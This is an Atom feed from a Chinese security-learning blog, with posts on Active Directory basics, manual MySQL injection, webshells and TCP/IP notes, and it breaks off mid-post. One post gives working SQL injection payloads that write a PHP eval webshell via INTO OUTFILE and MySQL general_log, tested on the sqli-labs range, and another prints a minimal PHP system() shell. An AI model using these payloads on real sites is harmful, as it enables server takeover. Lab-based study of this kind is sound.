<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://zzggtt.github.io</id>
    <title>ZG0T01</title>
    <updated>2020-11-05T08:37:45.030Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://zzggtt.github.io"/>
    <link rel="self" href="https://zzggtt.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://zzggtt.github.io/images/avatar.png</logo>
    <icon>https://zzggtt.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, ZG0T01</rights>
    <entry>
        <title type="html"><![CDATA[域环境搭建]]></title>
        <id>https://zzggtt.github.io/post/nei-wang-shen-tou-ji-chu/</id>
        <link href="https://zzggtt.github.io/post/nei-wang-shen-tou-ji-chu/">
        </link>
        <updated>2020-11-03T12:19:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="前言">前言</h3>
<p>本想记录一下搭建域环境的学习过程，但是发现倾旋师傅的文章<a href="https://payloads.online/archivers/2019-04-13/1">最快的方式搭建域环境</a>写的非常详细，于是准备写一写有关于域的相关基础知识。</p>
<h3 id="域和工作组">域和工作组</h3>
<ul>
<li>
<p><strong>工作组</strong></p>
<p>工作组是最简单的Windows资源管理模式，它具有<code>分布式管理</code>功能。每个用户独立的管理自己的计算机，只能在其计算机上使用其登陆凭证进行登录。大多数存储是分布式的。每个设备都有自己的专用存储。</p>
</li>
<li>
<p><strong>域</strong></p>
<p>域是客户端/服务器的网络资源管理模式，具有<code>集中管理</code>功能。用户使用其登陆凭证可以在域中的任何设备登录，所有设备都可以在集中设备（DC）上进行管理，所有用户数据都集中存储。</p>
</li>
</ul>
<p><strong>区别</strong>：</p>
<table>
<thead>
<tr>
<th style="text-align:center">序号</th>
<th style="text-align:center">域</th>
<th style="text-align:center">工作组</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1、</td>
<td style="text-align:center">域中的计算机具有集中式数据库。</td>
<td style="text-align:center">工作组中的计算机主要具有自己的本地数据库。</td>
</tr>
<tr>
<td style="text-align:center">2、</td>
<td style="text-align:center">域主要是仅传输和共享敏感的重要数据。</td>
<td style="text-align:center">工作组仅由于安全性较低而用于共享安全性和个人数据较少的内容。</td>
</tr>
<tr>
<td style="text-align:center">3、</td>
<td style="text-align:center">域主要是大型公共和企业网络的首选。</td>
<td style="text-align:center">工作组主要是小型局域网的首选，例如学校，学院，建筑物等。</td>
</tr>
<tr>
<td style="text-align:center">4、</td>
<td style="text-align:center">由于安全性，域用于传输和共享敏感的重要数据。</td>
<td style="text-align:center">由于安全性较低，工作组用于共享个人数据。</td>
</tr>
<tr>
<td style="text-align:center">5、</td>
<td style="text-align:center">域对于大量设备可以更好地工作。</td>
<td style="text-align:center">工作组对较少的计算机更好地工作。</td>
</tr>
<tr>
<td style="text-align:center">6、</td>
<td style="text-align:center">域名由域控制器根据IP地址提供。</td>
<td style="text-align:center">在工作组中，没有任何依赖于硬件组件和服务器的名称分配。</td>
</tr>
<tr>
<td style="text-align:center">7、</td>
<td style="text-align:center">可以从集中式存储中的域中恢复数据。</td>
<td style="text-align:center">由于每个设备的本地存储，因此无法在工作组中进行数据恢复。</td>
</tr>
<tr>
<td style="text-align:center">8、</td>
<td style="text-align:center">可以使用一个或多个不同网络域的设备并向其中添加所有预期的设备来形成域。</td>
<td style="text-align:center">同一网络中的设备只能添加到工作组中。</td>
</tr>
</tbody>
</table>
<h3 id="dcdomain-controller">DC（Domain Controller）</h3>
<p>在域管理模式下，负责响应Windows Server域中的安全身份验证请求的服务器称为“域控制器（Domain Controller，简写为DC）。网络管理员通过在<code>域控制器</code>上集中管理大量的pc机。</p>
<p>域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的<code>数据库</code>。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。</p>
<h3 id="adactive-directory">AD（Active Directory）</h3>
<p>Active Directory（AD）是Microsoft专有的<code>目录服务</code>。它在Windows Server上运行，用于管理网络上的设备和资源。</p>
<p>目录是一种分层结构，用于存储有关网络上对象的信息。而目录服务，例如Active Directory域服务（AD DS），提供了用于<code>存储目录数据</code>，并使网络用户和管理员可以<code>使用此数据</code>的方法。</p>
<p>域内所有的计算机共享一个集中式的目录数据库（又称为AD数据库），它包含着整个域内的<code>对象</code>（用户账户、计算机账户、打印机、共享文件等）和安全信息等等，而活动目录负责目录数据库的操作（增删修改）。</p>
<p>所以建立域控制器服务器的过程，其实就是安装AD的过程。</p>
<h3 id="域-树-林-组织单位">域、树、林、组织单位</h3>
<p>Active Directory域服务使用由域，树和林组成的分层布局来协调网络元素。</p>
<ul>
<li>
<p>域</p>
<p>域是一组对象。如用户或设备，共享相同AD数据库。域具有域名系统（DNS）结构。</p>
</li>
<li>
<p>树</p>
<p>树是是组合在一起的一个或多个域。树结构使用连续的名称空间来收集逻辑层次结构中的域集合。可以将树视为信任关系，其中在两个域之间共享安全连接或信任。</p>
</li>
<li>
<p>林</p>
<p>林是有一棵或多棵域树组成的，每棵域树独享连续的命名空间，不同域树之间没有命名空间的连续性。林中第一棵域树的根域也整个林的根域，同时也是林的名称。</p>
</li>
<li>
<p>组织单位</p>
<p>组织用户，组和设备。每个域可以包含自己的OU。但是，OU不能具有单独的名称空间，因为域中的每个用户或对象都必须是唯一的。例如，无法创建具有相同用户名的用户帐户。</p>
</li>
</ul>
<p><strong>参考链接：</strong></p>
<p>https://www.geeksforgeeks.org/difference-between-domain-and-workgroup/</p>
<p>https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview</p>
<p>https://blog.csdn.net/qq_39101049/article/details/99678671</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Mysql注入点写Webshell]]></title>
        <id>https://zzggtt.github.io/post/mysql-zhu-ru-dian-xie-webshell/</id>
        <link href="https://zzggtt.github.io/post/mysql-zhu-ru-dian-xie-webshell/">
        </link>
        <updated>2020-10-28T01:52:50.000Z</updated>
        <content type="html"><![CDATA[<h2 id="基础知识">基础知识</h2>
<h3 id="指令基础">指令基础</h3>
<p>在 MySQL 中，可以使用 SELECTI...INTO OUTFILE 语句，将表的数据导出成一个文件。</p>
<p>语法格式如下：</p>
<pre><code class="language-mysql">SELECT 列名 FROM table [WHERE 语句] INTO OUTFILE '目标文件'[OPTIONS]
</code></pre>
<p><code>SELECT</code>语句查询出所需数据，然后将其导出到<code>目标文件</code>中，<code>OPTIONS</code>为可选参数，常用值如下：</p>
<ul>
<li>FIELDS TERMINATED BY '字符串'：为字段之间设置字符串作为分隔符</li>
<li>COLUMNS TERMINATED BY '字符串'：为列之间设置字符串作为分隔符</li>
<li>LINES TERMINATED BY '字符串'：为每行数据结尾设置字符串</li>
<li>LINES STARTING BY '字符串'：为每行数据开头设置字符串</li>
</ul>
<h3 id="环境条件">环境条件</h3>
<blockquote>
<p>注入点：select注入点</p>
<p>数据库用户：File权限</p>
<p>secure_file_priv：支持web目录文件导出</p>
<p>物理路径：'G:/Tools/phpstudy_pro/WWW/sqli-labs/'</p>
<p>数据库和Web服务器在同一台服务器上</p>
</blockquote>
<ul>
<li><strong>File权限</strong></li>
</ul>
<p>指的是数据库用户能否对服务器主机上的文件进行读写操作，这样才可以执行select into outfile，load data infile操作。</p>
<ul>
<li><strong>secure_file_priv</strong></li>
</ul>
<p>secure-file-priv是mysql的新特性，用来限制对读写文件的权限，即规定了select into outfile，load data infile操作的目录。</p>
<p>通过以下命令可以查看secure-file-priv的值：</p>
<pre><code class="language-sql">SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;secure-file-priv;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1603850118588.png" alt="" loading="lazy"></figure>
<p>目前环境下的值为NULL，即不允许导入导出。</p>
<p>经查资料，secure-file-priv的值的：</p>
<p>（1）NULL，表示禁止。</p>
<p>（2）如果value值有文件夹目录，则表示只允许该目录下文件（PS：测试子目录也不行）。</p>
<p>（3）如果为空，则表示不限制目录。</p>
<p>可以在mysql的配置文件中（Windows下为my.ini, Linux下的my.cnf），修改值（如果没有就自己加上）。这里直接设置为不限制目录，然后重启数据库：</p>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1603850125437.png" alt="" loading="lazy"></figure>
<p>这里踩了很久的坑，使用phpstudy的mysql，如果直接用Windows的笔记本打开my.ini，会导致后续数据库启动失败。</p>
<p>然后查看是否修改成功：</p>
<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1603850131228.png" alt="" loading="lazy"></figure>
<h2 id="getshell">Getshell</h2>
<h3 id="1-利用-union-select">1、利用 union select</h3>
<p>当注入点为<code>union注入</code>时，利用 union select &quot;一句话木马&quot; into outfile '物理路径/xxx.php'，将一句话导出到xxx.php中。</p>
<pre><code class="language-php">?id=1 union select 1,&quot;&lt;?php @eval($_POST['passwd']);?&gt;&quot;,3 into outfile 'G:/Tools/phpstudy_pro/WWW/sqli-labs/webshell.php'--
?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile &quot;G:/Tools/phpstudy_pro/WWW/sqli-labs/webshell.php&quot;--
</code></pre>
<h3 id="2-利用-opetions分隔符">2、利用 OPETIONS（分隔符）</h3>
<p>当Mysql注入点为<code>盲注</code>或<code>报错注入</code>时，union select 的写入方式不可行。</p>
<p>通过添加OPTIONS直接在Sql语句后面写入一句话（常用的四种都可使用）：</p>
<pre><code class="language-mysql">?id=1 LIMIT 0,1 INTO OUTFILE 'G:/Tools/phpstudy_pro/WWW/sqli-labs/evil.php' lines terminated by 0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27 --
?id=1 INTO OUTFILE '物理路径' lines terminated by  （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' fields terminated by （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' columns terminated by （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' lines starting by    （一句话hex编码）#
</code></pre>
<h3 id="3-日志getshell">3、日志getshell</h3>
<p>新版本的MySQL设置了secure_file_priv导出文件的路径，所以无法通过使用select into outfile来写入一句话。也很难去修改Mysql的配置文件。</p>
<figure data-type="image" tabindex="4"><img src="https://zzggtt.github.io/post-images/1603850170057.png" alt="" loading="lazy"></figure>
<p>该环境下还可以通过修改MySQL的log文件来获取Webshell。当开启日志后，Mysql会记录执行的SQL语句，通过把Webshell写入日志的方式来利用。</p>
<ul>
<li>
<p>环境条件：</p>
<p>数据库用户：<code>Super</code>和<code>File</code>服务器权限</p>
<p>物理路径：G:/Tools/phpstudy_pro/WWW/log.php</p>
</li>
<li>
<p>步骤</p>
<p>连接上Mysql后，执行如下命令：</p>
<pre><code class="language-mysql">//1、查询日志情况：
show variables like '%general%';   
//2、开启日志general log：
set global general_log = on;
//3、设置日志路径
set global general_log_file = 'G:/Tools/phpstudy_pro/WWW/webshell.php';
//4、写Webshell
select '&lt;?php eval($_GET[passwd]);?&gt;'             
//5、关闭日志
set global general_log=off;                  
</code></pre>
</li>
</ul>
<h2 id="靶场练习">靶场练习</h2>
<h3 id="1-环境搭建">1、环境搭建</h3>
<blockquote>
<p>靶场：https://github.com/Audi-1/sqli-labs</p>
<p>环境：phpstudy集成环境（Windows + Mysql + php + Apache）</p>
<p>数据库连接用户：root</p>
<p>secure_file_priv：secure_file_priv =</p>
</blockquote>
<p>此外在靶场网站路径下准备一个phpinfo.php（获取网站绝对路径使用）</p>
<h3 id="2-测试">2、测试</h3>
<p>注入点如下：</p>
<pre><code class="language-html+php">http://192.168.31.128/sqli-labs/Less-1/?id=1
</code></pre>
<p>进行简单的sql注入检测：</p>
<figure data-type="image" tabindex="5"><img src="https://zzggtt.github.io/post-images/1603850422253.png" alt="" loading="lazy"></figure>
<p>通过单引号触发sql语法报错，得到以下信息：</p>
<ul>
<li>Mysql数据库</li>
<li>参数是单引号闭合</li>
</ul>
<p>进一步通过布尔逻辑来验证注入点：</p>
<figure data-type="image" tabindex="6"><img src="https://zzggtt.github.io/post-images/1603850428657.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://zzggtt.github.io/post-images/1603850432457.png" alt="" loading="lazy"></figure>
<p>证实该注入点的存在。</p>
<p>有明显的数据回显，先试一试union注入是否可以：</p>
<ul>
<li>order by 测试字段数</li>
</ul>
<figure data-type="image" tabindex="8"><img src="https://zzggtt.github.io/post-images/1603850439217.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://zzggtt.github.io/post-images/1603850444296.png" alt="" loading="lazy"></figure>
<p>字段3排序正常，字段4报错，可以得出数据库表有三个字段。</p>
<ul>
<li>
<p>union select 测试回显字段是多少</p>
<pre><code class="language-php+HTML">http://192.168.31.128/sqli-labs/Less-1/?id=-1' union select 1,2,3--+
</code></pre>
</li>
</ul>
<figure data-type="image" tabindex="10"><img src="https://zzggtt.github.io/post-images/1603850451054.png" alt="" loading="lazy"></figure>
<p>可以看出回显到前端的字段是2和3。</p>
<p>因为是练习Getshell，就不进行后续的数据爆破。为了Getshell，需要先收集目标相关的信息，通过上面的报错我们了解到目标数据库为Mysql，下面利用Mysql的一些系统函数来收集一些信息：</p>
<pre><code class="language-php+HTML">http://192.168.31.128/sqli-labs/Less-1/?id=-1' union select 1,concat_ws(',',user(),@@version_compile_os),3--+
</code></pre>
<figure data-type="image" tabindex="11"><img src="https://zzggtt.github.io/post-images/1603850456910.png" alt="" loading="lazy"></figure>
<p>得到信息如下：</p>
<ul>
<li>数据库连接用户：root （权限够了）</li>
<li>操作系统：Windows</li>
</ul>
<p>目前为止，还差网站的绝对路径，可以通过报错，phpinfo界面，404界面等一些方式去搜集。</p>
<p>这里用burpsuite扫一下目录，发现了phpinfo：</p>
<figure data-type="image" tabindex="12"><img src="https://zzggtt.github.io/post-images/1603850462487.png" alt="" loading="lazy"></figure>
<p>然后打开就能收集到网站绝对路径了：</p>
<p><img src="https://zzggtt.github.io/post-images/1603850466908.png" alt="" loading="lazy"><br>
至此Getshell所需的信息基本搜集的差不多了。</p>
<p>Getshell：</p>
<pre><code class="language-php+HTML">http://192.168.31.128/sqli-labs/Less-1/?id=1' union select 1,&quot;&lt;?php @eval($_POST['passwd']);?&gt;&quot;,3 into outfile 'G:/Tools/phpstudy_pro/WWW/sqli-labs/webshell.php'--+
</code></pre>
<figure data-type="image" tabindex="13"><img src="https://zzggtt.github.io/post-images/1603850471556.png" alt="" loading="lazy"></figure>
<p>使用Webshell管理工具连接：</p>
<figure data-type="image" tabindex="14"><img src="https://zzggtt.github.io/post-images/1603850475512.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="15"><img src="https://zzggtt.github.io/post-images/1603850478921.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Mysql手工注入检测和基础函数]]></title>
        <id>https://zzggtt.github.io/post/mysql-shou-gong-zhu-ru-jian-ce-he-ji-chu-han-shu/</id>
        <link href="https://zzggtt.github.io/post/mysql-shou-gong-zhu-ru-jian-ce-he-ji-chu-han-shu/">
        </link>
        <updated>2020-10-28T01:00:10.000Z</updated>
        <content type="html"><![CDATA[<h2 id="注入检测">注入检测</h2>
<h3 id="一-mysql基础">一、Mysql基础</h3>
<p>Mysql的逻辑架构图：</p>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1603847821786.png" alt="" loading="lazy"></figure>
<p>下面的内容采用如下源码进行分析：</p>
<pre><code class="language-php">//源码（sqli-labs）:
$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
</code></pre>
<pre><code class="language-mysql">//对应的sql语句 :
SELECT * FROM users WHERE id='1'' LIMIT 0,1
</code></pre>
<ul>
<li>
<p><strong>分析器</strong></p>
<blockquote>
<p>MySQL的<code>分析器</code>从输入的&quot;select&quot;这个关键字识别出来，这是一个查询语句。它也要把字符串“T”识别成“表名T”，把字符串“ID”识别成“列ID”。做完了这些识别以后，就要做“语法分析”。根据词法分析的结果，语法分析器会根据语法规则，判断你输入的这个SQL语句是否满足MySQL语法。如果你的语句不对，就会收到“You have an error in your SQL syntax”的错误提醒。</p>
</blockquote>
<p>举个例子：比如下面这个语句select少打了开头的字母“s”</p>
</li>
</ul>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1603847829863.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p><strong>执行器</strong></p>
<blockquote>
<p>MySQL通过分析器知道了你要做什么，通过优化器知道了该怎么做，于是就进入了<code>执行器</code>阶段，开始执行语句。</p>
</blockquote>
</li>
<li>
<p><strong>Mysql 逻辑与或运算</strong></p>
<blockquote>
<p>逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。</p>
<p>参考：https://www.runoob.com/mysql/mysql-operator.html</p>
<p>我自己的理解：</p>
<ul>
<li>AND：一假即假</li>
<li>OR：一真即真</li>
</ul>
</blockquote>
<p>自己多实践一些例子就能理解：</p>
<p>user表结构：</p>
</li>
</ul>
<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1603847836492.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://zzggtt.github.io/post-images/1603847842382.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="5"><img src="https://zzggtt.github.io/post-images/1603847849079.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="6"><img src="https://zzggtt.github.io/post-images/1603847853628.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://zzggtt.github.io/post-images/1603847858045.png" alt="" loading="lazy"></figure>
<h3 id="二-触发mysql语法错误-检测注入">二、触发mysql语法错误 检测注入</h3>
<p>常见的通过触发语法错误来检测注入的方式（是否成对匹配）：</p>
<table>
<thead>
<tr>
<th>'</th>
<th>False</th>
</tr>
</thead>
<tbody>
<tr>
<td>''</td>
<td>True</td>
</tr>
<tr>
<td>&quot;</td>
<td>False</td>
</tr>
<tr>
<td>&quot;&quot;</td>
<td>True</td>
</tr>
<tr>
<td>\</td>
<td>False</td>
</tr>
<tr>
<td>\</td>
<td>True</td>
</tr>
</tbody>
</table>
<pre><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=1'
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://zzggtt.github.io/post-images/1603848340972.png" alt="" loading="lazy"></figure>
<pre><code class="language-my">http://127.0.0.1/sqli-labs/Less-1/?id=1\
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://zzggtt.github.io/post-images/1603848346568.png" alt="" loading="lazy"></figure>
<pre><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://zzggtt.github.io/post-images/1603848351890.png" alt="" loading="lazy"></figure>
<h3 id="三-通过逻辑运算-检测注入">三、通过逻辑运算 检测注入</h3>
<p>以如下SQL语句为例：</p>
<pre><code class="language-mysql">SELECT * FROM users WHERE id = 1;
</code></pre>
<table>
<thead>
<tr>
<th>AND 1</th>
<th>True</th>
</tr>
</thead>
<tbody>
<tr>
<td>AND 0</td>
<td>False</td>
</tr>
<tr>
<td>id=3-1</td>
<td>返回2的数据即为True</td>
</tr>
<tr>
<td>id=1*3</td>
<td>返回3的数据即为True</td>
</tr>
</tbody>
</table>
<figure data-type="image" tabindex="11"><img src="https://zzggtt.github.io/post-images/1603848358428.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://zzggtt.github.io/post-images/1603848362778.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="13"><img src="https://zzggtt.github.io/post-images/1603848366369.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="14"><img src="https://zzggtt.github.io/post-images/1603848371231.png" alt="" loading="lazy"></figure>
<h2 id="基础函数">基础函数</h2>
<h3 id="mysql常用系统函数">Mysql常用系统函数</h3>
<blockquote>
<p>version()            #MySQL版本<br>
user()               #数据库用户名<br>
database()           #数据库名<br>
@@datadir            #数据库路径<br>
@@version_compile_os #操作系统版本</p>
</blockquote>
<figure data-type="image" tabindex="15"><img src="https://zzggtt.github.io/post-images/1603848377306.png" alt="" loading="lazy"></figure>
<h3 id="mysql连接函数">Mysql连接函数</h3>
<blockquote>
<p>函数具体介绍以及使用，参考：https://www.cnblogs.com/lcamry/p/5715634.html</p>
</blockquote>
<p>当我们使用union注入去获取数据库相关数据时，由于union select的特性，获取一条数据时不会又太大影响，例如：</p>
<pre><code class="language-sql">SELECT * FROM users WHERE id='1' UNION SELECT 1,user(),3
</code></pre>
<figure data-type="image" tabindex="16"><img src="https://zzggtt.github.io/post-images/1603848383577.png" alt="" loading="lazy"></figure>
<p>但是想要获取多条数据时，例如：</p>
<pre><code class="language-sql">SELECT * FROM users WHERE id='1' UNION SELECT 1,schema_name,3 FROM information_schema.SCHEMATA
</code></pre>
<figure data-type="image" tabindex="17"><img src="https://zzggtt.github.io/post-images/1603848390763.png" alt="" loading="lazy"></figure>
<p>以sqli-labs靶场源码为例，通常服务端是这样写的：</p>
<pre><code class="language-php">$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
$result=mysqli_query($con1, $sql);
</code></pre>
<p>结果就是这样的：</p>
<figure data-type="image" tabindex="18"><img src="https://zzggtt.github.io/post-images/1603848396222.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="19"><img src="https://zzggtt.github.io/post-images/1603848400663.png" alt="" loading="lazy"></figure>
<p>就只能爆出LIMIT 0,1 的数据。</p>
<p>所以通过使用连接函数来爆破多条数据：</p>
<pre><code class="language-sql">SELECT * FROM users WHERE id='-1' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.SCHEMATA LIMIT 0,1
</code></pre>
<figure data-type="image" tabindex="20"><img src="https://zzggtt.github.io/post-images/1603848406039.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="21"><img src="https://zzggtt.github.io/post-images/1603848410717.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[初识Webshell]]></title>
        <id>https://zzggtt.github.io/post/chu-shi-webshell/</id>
        <link href="https://zzggtt.github.io/post/chu-shi-webshell/">
        </link>
        <updated>2020-10-28T00:50:01.000Z</updated>
        <content type="html"><![CDATA[<h2 id="webshell">Webshell</h2>
<h3 id="1-shell">1、Shell</h3>
<p><strong>Shell</strong>是一个 <code>命令解释器</code> ：用于接收使用者输入的指令，并送入内核去执行。解释使用者输入的指令。是一种为使用者提供操作界面的软件。</p>
<p>基本上分为两大类：</p>
<ul>
<li>
<p>图像界面shell</p>
<p>应用最为广泛的 Windows Explorer （微软的windows系列操作系统），还有也包括广为人知的 Linux shell，其中linux shell 包括 X window manager (BlackBox和FluxBox），以及功能更强大的CDE、GNOME、KDE、 XFCE。</p>
</li>
<li>
<p>命令式shell</p>
<p>Unix/linux 系统：bash / sh / ksh / csh / zsh</p>
<p>Winodws系统：cmd.exe、PowerShell</p>
</li>
</ul>
<h3 id="2-webshell">2、Webshell</h3>
<p><strong>Webshell</strong>是一种Web形式的命令解释器，以asp、jsp、php或者cgi等动态脚本语言编写一种<code>执行系统代码</code>的环境。通过浏览器访问网站服务器Web目录下的Webshell，输入指令，来达到管理目标网站的服务器。</p>
<p>以最简单的php webshell为例：</p>
<pre><code class="language-php">&lt;?php
    system($_GET('command'));
?&gt;
</code></pre>
<p>通过GET方式comand参数来接收传递命令，然后交由system函数执行命令。</p>
<h3 id="3-webshell分类">3、Webshell分类</h3>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1603846217988.png" alt="" loading="lazy"></figure>
<h3 id="4-webshell管理工具">4、Webshell管理工具</h3>
<p>在以前菜刀没有出现的时候，我们想要获取 webshell 的时候，通常都是直接上传一个 web 木马并且直接用这个木马进行管理，由于这种大型木马的体量比较大，上传过程中容易被检测且不方便进行上传绕过测试，所以大家就想了一个办法，先上传一个体量小，功能少的小型木马然后再通过小马的简单的上传或者文件修改等单个功能进行大马的上传。小马的功能通常是围绕文件管理的功能，比较简单，如：文件上传、文件修改、新建文件等，都是围绕方便上传一个体量大的木马来做的。自从菜刀出现之后，渐渐的一句话木马成为了主流，体量小，还有一个界面版的客户端进行管理操作，极大的方便的大家对于 web 服务器的管理。</p>
<p>上传完大马后，直接访问对应位置即可进行相应管理：</p>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1603846222969.png" alt="" loading="lazy"></figure>
<p>而一句话木马则提供了一个界面版的客户端进行管理操作，极大的方便的大家对于Web服务器的管理：</p>
<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1603846229853.png" alt="" loading="lazy"></figure>
<p>常见的Webshell管理工具：https://www.cnblogs.com/xiaozi/p/12397211.html</p>
<p>参考：https://mp.weixin.qq.com/s/x2Tw3ukaTFDJvZ0YCuZBog</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[《图解TCP/IP》读书笔记]]></title>
        <id>https://zzggtt.github.io/post/lesslesstu-jie-tcpipgreatergreater-du-shu-bi-ji/</id>
        <link href="https://zzggtt.github.io/post/lesslesstu-jie-tcpipgreatergreater-du-shu-bi-ji/">
        </link>
        <updated>2020-10-08T08:56:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="前言">前言</h3>
<p>了解TCP/IP是对渗透测试很有必要的，下面是我阅读完《图解TCP/IP》后，记录的一些重要的知识点。</p>
<p>（随着我的渗透测试学习，将会持续更新！！！）</p>
<h3 id="tcpip概述">TCP/IP概述</h3>
<h4 id="1-含义">1、含义</h4>
<p>互联网在进行通信时，需要相应的网络协议，而在网络中被广泛使用的TCP/IP协议。TCP/IP协议在多数情况下指的是：利用IP进行通信时所必须用到的协议群的统称。</p>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1603526064488.png" alt="" loading="lazy"></figure>
<h4 id="2-分层模型">2、分层模型</h4>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1603526073786.png" alt="" loading="lazy"></figure>
<p>OSI参考模型注重“通信协议必要的功能是什么”，而TCP/IP则更强调“在计算机上实现协议应该开放哪种程序”</p>
<ul>
<li>
<p><strong>硬件层</strong></p>
<p>TCP/IP的最底层的主要作用是负责数据传递的硬件。</p>
</li>
<li>
<p><strong>网卡层</strong></p>
<p>网卡层也称网络接口层，可以理解为“驱动程序”。它是硬件与操作系统之间的桥梁。计算机的外设不是直接插上就能使用的，还需要“驱动程序”的支持。所以通常需要在操作系统上安装一些<code>驱动程序软件</code>，才能使用这些附加硬件。</p>
</li>
<li>
<p><strong>互联网层</strong></p>
<p>互联网层使用IP协议，IP协基于IP地址转发分发数据。</p>
</li>
</ul>
<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1603526079889.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p><strong>传输层</strong></p>
<p>传输层的主要功能是让应用程序软件之间实现通信，它具有来个代表性的协议：TCP、UDP。</p>
</li>
</ul>
<figure data-type="image" tabindex="4"><img src="https://zzggtt.github.io/post-images/1603526084292.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p><strong>应用层</strong></p>
<p>TCP/IP的应用层把OSI参考模型中的会话层、表示层、应用层的功能都集中到<code>应用程序软件</code>中来实现。TCP/IP应用的架构绝大数属于<code>C/S架构</code>。</p>
<p>提供服务的应用程序叫做服务端，接收服务的应用程序叫做客户端。在这种通信模式中，提供服务的程序会被预先部署到<code>服务器主机</code>上，等待接收任何时刻客户端发送的请求。</p>
</li>
</ul>
<figure data-type="image" tabindex="5"><img src="https://zzggtt.github.io/post-images/1603526090062.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p>WWW</p>
<p>在WWW中，用户通过Web浏览器（客户端），就可以访问存储在Web服务器上的各种信息。Web浏览器和Web服务器之间的通信协议是<code>HTTP</code>（应用层协议），所传输的数据的主要格式是<code>HTML</code>（表示层协议）。</p>
</li>
</ul>
<figure data-type="image" tabindex="6"><img src="https://zzggtt.github.io/post-images/1603526103650.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p>电子邮件</p>
<p>电子邮件之在网络上发送邮件，发送邮件的通信协议是<code>SMPT</code>（应用层协议）。起初只能发送文本格式，然而现在电子邮件由MIME协议（表示层协议）拓展后，就可以发送声音、图片等各式各样的信息。</p>
</li>
</ul>
<figure data-type="image" tabindex="7"><img src="https://zzggtt.github.io/post-images/1603526113007.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p>文件传输</p>
<p>文件传输协议是指将保存在其他计算机硬盘上的文件传输到本地硬盘上，该过程使用的协议是<code>FTP</code>。</p>
</li>
</ul>
<figure data-type="image" tabindex="8"><img src="https://zzggtt.github.io/post-images/1603526118579.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p>远程登陆</p>
<p>远程登陆指的是登录到远程的计算机上。在TCP/IP中常用<code>TELNET</code>和<code>SSH</code>两种协议。</p>
</li>
</ul>
<figure data-type="image" tabindex="9"><img src="https://zzggtt.github.io/post-images/1603526123676.png" alt="" loading="lazy"></figure>
<h4 id="3-通信示例">3、通信示例</h4>
<figure data-type="image" tabindex="10"><img src="https://zzggtt.github.io/post-images/1603526128849.png" alt="" loading="lazy"></figure>
<h3 id="地址的唯一性">地址的唯一性</h3>
<blockquote>
<p>在TCP/IP或UDP/IP通信中，通常采用5个信息来识别一个通信。分别是：“源IP地址”、“目标IP地址”、“协议号”、“源端口地址”、“目标端口地址”。</p>
</blockquote>
<h4 id="基础概念">基础概念</h4>
<ul>
<li>
